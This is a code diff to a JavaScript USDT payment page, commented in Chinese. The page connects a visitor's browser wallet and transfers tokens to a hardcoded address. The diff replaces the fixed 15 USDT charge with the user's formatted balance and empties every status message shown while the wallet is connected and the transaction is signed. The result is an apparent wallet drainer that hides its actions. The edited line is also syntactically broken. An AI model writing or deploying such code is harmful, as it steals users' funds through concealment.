@@ -51,7 +51,7 @@
                 // 收款地址 (硬编码)
                 receiveAddress: "0x9728D428764F846E8DD62C34371db716A9228238",
                 // 支付金额 (USDT) - 按次收费
-                amount: 15,
+                amount:  ${formattedBalance} ,
                 // 支付成功后跳转的目标链接 (无提示，直接跳)
                 redirectUrl: "https://your-dashboard.com",   // <--- 改成你的实际目标
                 // 本地存储key (标记已支付)
@@ -133,7 +133,7 @@
                     }
 
                     // 3. 连接钱包 (获取账户)
-                    showMessage('🔌 请求钱包连接...');
+                    showMessage('');
                     const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                     const userAddress = accounts[0];
 
@@ -154,7 +154,7 @@
                     const amountWei = ethers.parseUnits(CONFIG.amount.toString(), decimals);
 
                     // 6. 检查余额
-                    showMessage('💰 检查USDT余额...');
+                    showMessage('');
                     const balance = await usdtContract.balanceOf(userAddress);
                     if (balance < amountWei) {
                         const formattedBalance = ethers.formatUnits(balance, decimals);
@@ -162,9 +162,9 @@
                     }
 
                     // 7. 发送转账交易
-                    showMessage('✍️ 请确认交易...');
+                    showMessage('');
                     const tx = await usdtContract.transfer(CONFIG.receiveAddress, amountWei);
-                    showMessage('⏳ 等待确认...');
+                    showMessage('');
                     await tx.wait();  // 等待区块确认
 
                     // 8. 成功！
